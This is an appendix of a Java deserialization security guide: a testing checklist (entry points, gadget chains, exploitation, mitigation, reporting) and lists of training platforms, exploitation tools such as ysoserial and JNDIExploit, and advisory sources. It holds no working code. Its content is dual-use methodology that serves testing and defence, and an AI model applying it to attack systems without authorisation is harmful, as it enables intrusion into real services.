## Appendix: Testing Checklist

### Deserialization Security Testing Checklist

```
[ ] Entry Point Discovery
    [ ] RMI endpoints identified
    [ ] JMX services discovered
    [ ] T3 protocol endpoints found
    [ ] HTTP endpoints accepting serialized data
    [ ] File upload handlers analyzed
    [ ] Session mechanisms reviewed

[ ] Library Identification
    [ ] Java native serialization usage confirmed
    [ ] Jackson version identified
    [ ] Fastjson version identified
    [ ] Other serialization libraries cataloged
    [ ] Dependencies analyzed for known gadgets

[ ] Gadget Chain Analysis
    [ ] Commons Collections availability checked
    [ ] Spring framework gadgets analyzed
    [ ] Hibernate gadgets assessed
    [ ] Custom application gadgets discovered
    [ ] Classpath mapped for potential chains

[ ] Exploitation Testing
    [ ] Basic gadget chain tested
    [ ] Blind exploitation attempted
    [ ] Time-based detection tested
    [ ] Out-of-band detection used
    [ ] Impact demonstrated safely

[ ] Mitigation Assessment
    [ ] Input validation checked
    [ ] Class allowlisting implemented
    [ ] Network segmentation verified
    [ ] Monitoring capabilities assessed
    [ ] Incident response procedures documented

[ ] Documentation
    [ ] Vulnerability details recorded
    [ ] Proof of concept prepared
    [ ] Impact assessment completed
    [ ] Remediation recommendations provided
    [ ] Report submitted through proper channels
```

## Appendix: Deserialization Security Resources

### Online Learning Platforms

1. **PortSwigger Web Security Academy**
   - Deserialization modules
   - Hands-on labs
   - Free access

2. **Hack The Box**
   - Machine challenges with deserialization
   - Expert-level challenges
   - Community writeups

3. **PentesterLab**
   - Java deserialization exercises
   - Ruby deserialization exercises
   - Step-by-step guides

### Tool Repositories

1. **ysoserial** - Java deserialization payloads
2. **marshalsec** - Java marshalling exploitation
3. **JNDIExploit** - JNDI exploitation toolkit
4. **gadgetinspector** - Gadget chain discovery
5. **java-serial-analyzer** - Serialization analysis

### Security Advisories

1. Oracle Critical Patch Updates
2. Apache Security Advisories
3. Red Hat Security Advisories
4. MITRE CVE Database
5. NVD (National Vulnerability Database)

